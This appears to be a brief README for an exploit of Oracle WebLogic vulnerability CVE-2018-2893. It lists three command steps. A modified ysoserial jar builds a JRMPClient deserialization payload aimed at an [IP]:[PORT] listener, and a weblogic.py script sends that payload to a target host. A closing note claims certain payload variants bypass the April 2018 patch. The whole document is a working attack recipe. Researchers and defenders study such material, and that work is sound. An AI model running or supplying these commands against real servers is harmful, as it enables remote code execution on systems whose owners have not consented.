# CVE-2018-2893

## Step 1

`java -jar ysoserial-cve-2018-2893.jar`

```
WHY SO SERIAL?
Usage: java -jar ysoserial-cve-2018-2893.jar [payload] '[command]'
Available payload types:
     Payload     Authors   Dependencies
     -------     -------   ------------
     JRMPClient  @mbechler
     JRMPClient2 @mbechler
     JRMPClient3 @mbechler
     JRMPClient4 @mbechler
     Jdk7u21     @frohoff
```

## Step 2

`java -jar ysoserial-cve-2018-2893.jar  JRMPClient4  "[IP]:[PORT]"  >  poc4.ser`

## Step 3

`python weblogic.py [HOST] [PORT] poc4.ser`


### Note: Any one of  JRMPClient2|JRMPClient3|JRMPClient4 can be utilized to  bypass the Critical Patch Update April 2018.
